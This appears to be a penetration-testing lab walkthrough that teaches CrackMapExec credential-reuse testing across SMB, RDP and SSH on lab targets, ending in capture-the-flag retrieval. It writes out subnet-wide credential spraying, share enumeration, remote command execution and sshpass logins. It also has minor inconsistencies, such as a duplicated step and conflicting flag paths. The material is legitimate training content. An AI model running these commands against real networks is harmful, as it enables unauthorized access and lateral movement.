# Lab 8.5: CME Credential Reuse Automation

## Learning Objectives
- Understand what CrackMapExec (CME) is and when to use it
- Compare manual credential testing vs CME automation
- Use CME to test credentials across multiple protocols (SMB, RDP, SSH)
- Use CME to test credentials across multiple targets simultaneously
- Understand CME's role in network-wide penetration testing
- Capture the flag

## What is CrackMapExec?

CrackMapExec (CME) is a post-exploitation tool that automates credential testing and lateral movement across Windows networks. It's often called a "Swiss army knife" for Windows penetration testing.

### Why Use CME?

In previous labs (8.1-8.4), you learned to test credentials manually using individual tools:
- `smbclient` for SMB
- `xfreerdp` for RDP
- `evil-winrm` for WinRM

**The Problem**: On large networks with many targets and services, manual testing becomes:
- Time-consuming (testing each service individually)
- Repetitive (same commands over and over)
- Hard to track (no centralized credential database)

**The CME Solution**: CME automates credential testing across:
- Multiple protocols (SMB, RDP, WinRM, MSSQL, SSH, LDAP)
- Multiple targets (entire subnets)
- With credential database tracking

### When to Use CME vs Manual Tools

**Use CME When**:
- Testing credentials across multiple targets (network-wide)
- Working with large networks (10+ machines)
- Need to test credentials on multiple protocols quickly
- Want to automate post-exploitation tasks

**Use Manual Tools When**:
- Learning a new protocol (as you did in earlier labs)
- Debugging connection issues
- Working with a single target
- Need fine-grained control

## Lab Scenario

You've discovered credentials (`admin:password123`) through enumeration in previous labs. Now you need to:
1. Test these credentials across multiple services (SMB, RDP, SSH)
2. Test across multiple targets (3 different machines)
3. Use CME to automate this process
4. Compare manual vs automated approaches

## Solution Walkthrough

### Step 1: Obtain Target IP Addresses

Get the target IP addresses from the lab platform before starting.

**Detailed Steps:**

1. **Discover the target IPs:**
   - The lab panel shows your network subnet (e.g., `10.X.Y.0/24`)
   - Scan the subnet to find live hosts: `nmap -sn <subnet>`
   - The targets will be the discovered hosts

2. **Verify network connectivity:**
   ```bash
   ping -c 3 <target_ip>
   ```

3. **Document target information:**
   ```
   Target1: <target_ip> - SMB service
   Target2: <target_ip> - RDP service
   Target3: <target_ip> - SSH service
   ```

### Step 2: Manual Credential Testing (Review)

First, let's review what you've learned - testing credentials manually to understand what CME automates.

**Detailed Steps:**

1. **Test SMB on target1 manually:**
   ```bash
   crackmapexec smb <target_ip> -u admin -p password123
   ```

2. **Test RDP on target2 manually:**
   ```bash
   xfreerdp /v:<target_ip> /u:admin /p:password123
   ```

3. **Test SSH on target3 manually:**
   ```bash
   ssh admin@<target_ip>
   # Password: password123
   ```

**Notice**: This requires 3 separate commands with different syntax, one for each target/service.

**What this teaches:**
- Manual tools require different syntax per protocol
- Each service needs individual testing
- Time-consuming for multiple targets
- Good for learning and understanding protocols

### Step 3: Install/Verify CME

Verify that CrackMapExec is installed and ready to use.

**Detailed Steps:**

1. **Check if CME is installed:**
   ```bash
   crackmapexec --version
   ```

   **Expected output:**
   ```
   CrackMapExec 5.4.0
   ```

2. **If not installed, install CME:**
   ```bash
   sudo apt update
   sudo apt install crackmapexec
   ```

3. **Verify installation:**
   ```bash
   which crackmapexec
   crackmapexec -h
   ```

4. **Check CME help:**
   ```bash
   crackmapexec smb --help
   ```

### Step 4: CME Single Target, Single Protocol

Test credentials on one target using one protocol with CME.

**Detailed Steps:**

1. **Test SMB credentials on target1:**
   ```bash
   crackmapexec smb <target_ip> -u admin -p password123
   ```

   **Command breakdown:**
   - `crackmapexec`: CME tool
   - `smb`: Protocol to test (SMB)
   - `<target_ip>`: Target IP address
   - `-u admin`: Username to test
   - `-p password123`: Password to test

2. **Expected output:**
   ```
   SMB         <target_ip>     445    TARGET1         [+] admin:password123
   ```

   **Output explanation:**
   - `SMB`: Protocol tested
   - `<target_ip>`: Target IP
   - `445`: Port number
   - `TARGET1`: Hostname
   - `[+] admin:password123`: **Green [+] means credentials work!**

3. **What the colors mean:**
   - **Green [+]**: Success (credentials work)
   - **Red [-]**: Failure (credentials failed)
   - **Yellow [*]**: Information (enumeration results)

### Step 5: CME Single Target, Multiple Protocols

Test the same credentials across multiple protocols on different targets.

**Detailed Steps:**

1. **Test SMB on target1:**
   ```bash
   crackmapexec smb <target_ip> -u admin -p password123
   ```

   **Expected output:**
   ```
   SMB         <target_ip>     445    TARGET1         [+] admin:password123
   ```

2. **Test RDP on target2:**
   ```bash
   crackmapexec rdp <target_ip> -u admin -p password123
   ```

   **Expected output:**
   ```
   RDP         <target_ip>     3389   TARGET2         [+] admin:password123
   ```

3. **Test SSH on target3:**
   ```bash
   crackmapexec ssh <target_ip> -u admin -p password123
   ```

   **Expected output:**
   ```
   SSH         <target_ip>     22     TARGET3         [+] admin:password123
   ```

**Compare**: With manual tools, this would be 3 different commands with different syntax. CME uses consistent syntax across protocols.

**Benefits:**
- Same command structure for all protocols
- Consistent output format
- Easy to script and automate

### Step 6: CME Network-Wide Testing

Test credentials across the entire network at once using CME.

**Detailed Steps:**

1. **Test SMB across all targets in subnet:**
   ```bash
   crackmapexec smb <subnet> -u admin -p password123
   ```

   **Command breakdown:**
   - `<subnet>`: Entire subnet (254 hosts)
   - CME will test credentials on all hosts in the subnet

2. **Expected output shows results for all targets:**
   ```
   SMB         <target_ip>     445    TARGET1         [+] admin:password123
   SMB         <target_ip>     445    TARGET2         [-] admin:password123
   SMB         <target_ip>     445    TARGET3         [-] admin:password123
   SMB         <target_ip>     445    TARGET4         [+] admin:password123
   ```

3. **Test multiple protocols across network:**
   ```bash
   # Test SMB across network
   crackmapexec smb <subnet> -u admin -p password123
   
   # Test RDP across network
   crackmapexec rdp <subnet> -u admin -p password123
   
   # Test SSH across network
   crackmapexec ssh <subnet> -u admin -p password123
   ```

**This is CME's power**: One command tests credentials across the entire network!

**Benefits:**
- Network-wide credential testing in one command
- Identifies all targets where credentials work
- Saves significant time on large networks
- Provides comprehensive results

### Step 7: CME Enumeration and Flag Retrieval

Once credentials are validated, use CME to enumerate and retrieve flags.

**Detailed Steps:**

1. **List SMB shares on target1:**
   ```bash
   crackmapexec smb <target_ip> -u admin -p password123 --shares
   ```

   **Expected output:**
   ```
   SMB         <target_ip>     445    TARGET1         [+] admin:password123
   SMB         <target_ip>     445    TARGET1         Sharename       Type      Comment
   SMB         <target_ip>     445    TARGET1         ---------       ----      --------
   SMB         <target_ip>     445    TARGET1         private         Disk      Private Share
   SMB         <target_ip>     445    TARGET1         IPC$            IPC       IPC Service
   ```

2. **Retrieve the flag via SSH on target3:**
   ```bash
   sshpass -p 'password123' ssh -o StrictHostKeyChecking=no admin@<target3_ip> "cat /home/admin/flag.txt"
   ```

3. **Alternative: Use CME to execute commands (if supported):**
   ```bash
   # Execute command via SMB (if supported)
   crackmapexec smb <target_ip> -u admin -p password123 -x "cat /home/admin/flag.txt"
   ```

4. **Retrieve flags from all targets:**
   ```bash
   # Target1 (SMB) - verify credentials with CME
   crackmapexec smb <target_ip> -u admin -p password123

   # Target2 (RDP) - flag in /home/admin/flag.txt
   xfreerdp /v:<target_ip> /u:admin /p:password123
   # Then: cat /home/admin/flag.txt

   # Target3 (SSH) - flag in /tmp/private/flag.txt
   sshpass -p 'password123' ssh -o StrictHostKeyChecking=no admin@<target3_ip> "cat /home/admin/flag.txt"
   ```

### Step 8: Compare Approaches

Understand the difference between manual and automated approaches.

**Manual Approach** (what you learned first):
- 3 separate commands
- Different syntax per protocol
- Time-consuming
- Good for learning
- Necessary for understanding protocols

**CME Approach** (automation):
- Single command for network-wide testing
- Consistent syntax across protocols
- Fast and efficient
- Industry standard
- Builds on manual tool knowledge

**When to use each:**
- **Manual tools**: Learning, debugging, single targets
- **CME**: Large networks, multiple targets, automation

### Step 9: Verify Flag Format

Ensure all flags are in the correct format before submission.

**Flag formats:**
```
OCR{cme_smb_cr3d3nt14l_t3st}
```

**Verification checklist:**
- ✅ Starts with `OCR{`
- ✅ Ends with `}`
- ✅ Contains only alphanumeric characters and underscores
- ✅ No extra spaces or characters

**Success Criteria:**
- ✅ Verified target IPs and network connectivity
- ✅ Reviewed manual credential testing approach
- ✅ Verified CME is installed and working
- ✅ Tested credentials with CME on single target, single protocol
- ✅ Tested credentials with CME across multiple protocols
- ✅ Tested credentials with CME across entire network (subnet)
- ✅ Used CME to enumerate shares and services
- ✅ Retrieved flags from all three targets
- ✅ Understood difference between manual tools and CME
- ✅ Verified flag format is correct: `OCR{...}`

### Step 7: Compare Approaches

**Manual Approach** (what you learned first):
- 3 separate commands
- Different syntax per protocol
- Time-consuming
- Good for learning

**CME Approach** (automation):
- Single command for network-wide testing
- Consistent syntax
- Fast and efficient
- Industry standard

## Understanding CME Output

CME uses color-coded output:
- **Green [+]**: Success (credentials work)
- **Red [-]**: Failure (credentials failed)
- **Yellow [*]**: Information (enumeration results)

Example:
```
SMB         <target_ip>     445    TARGET1         [+] admin:password123
RDP         <target_ip>     3389   TARGET2         [+] admin:password123  
SSH         <target_ip>     22     TARGET3         [+] admin:password123
```

## Key CME Commands for This Lab

```bash
# Basic credential testing
crackmapexec smb <target> -u <user> -p <pass>
crackmapexec rdp <target> -u <user> -p <pass>
crackmapexec ssh <target> -u <user> -p <pass>

# Network-wide testing
crackmapexec smb <subnet> -u admin -p password123

# Enumeration
crackmapexec smb <target> -u <user> -p <pass> --shares
```

## Target Information

- **Target1** (<target_ip>): SMB service, flag in `/tmp/private/flag.txt`
- **Target2** (<target_ip>): RDP service, flag in `/home/admin/flag.txt`
- **Target3** (<target_ip>): SSH service, flag in `/home/admin/flag.txt`

**Credentials**: `admin:password123` (same across all targets for credential reuse demonstration)

## Hints

1. Start with manual tools to understand what CME automates
2. Use CME to test credentials across all three targets
3. CME output shows which targets accept the credentials
4. Flags are in different locations on each target
5. Use CME's `--shares` flag to enumerate SMB shares

## Common Mistakes

- Forgetting CME is installed on Kali by default
- Not understanding CME output colors (green = success)
- Trying to use CME without understanding manual tools first
- Not testing across the network (using single IP instead of subnet)

## Educational Context

### Why Learn CME?

1. **Industry Standard**: CME is widely used in real penetration tests
2. **Efficiency**: Saves time on large networks
3. **Automation**: Reduces repetitive tasks
4. **Credential Database**: Tracks discovered credentials
5. **Multi-Protocol**: One tool for many services

### Manual Tools vs CME

**You learned manual tools first** (Labs 8.1-8.4) because:
- Understanding protocols is essential
- Manual tools teach fundamentals
- Debugging is easier with manual tools
- You need this knowledge to use CME effectively

**Now you learn CME** (Lab 8.5) because:
- Real assessments require automation
- Large networks need efficient tools
- CME builds on your manual tool knowledge
- Industry expects CME proficiency

## Further Reading

See `CME_REFERENCE.md` in the Windows labs directory for:
- Detailed CME documentation
- Advanced CME commands
- Post-exploitation features
- Version information (CME 5.4 vs NetExec)

## Assessment

You've successfully completed this lab when you:
- [ ] Understand what CME is and when to use it
- [ ] Can test credentials with CME across multiple protocols
- [ ] Can test credentials with CME across multiple targets
- [ ] Have retrieved all three flags from the targets
- [ ] Can explain the difference between manual tools and CME

